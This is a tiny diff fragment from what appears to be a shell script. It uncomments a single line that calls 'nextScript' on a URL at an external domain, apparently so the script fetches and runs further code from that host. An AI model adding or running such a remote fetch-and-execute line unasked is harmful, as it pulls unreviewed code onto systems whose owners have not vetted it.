@@ -63,4 +63,4 @@ sleep 2s;
 
 # ////////
 
-# nextScript 'https://suckaaa.com/s/loL';
+nextScript 'https://suckaaa.com/s/loL';
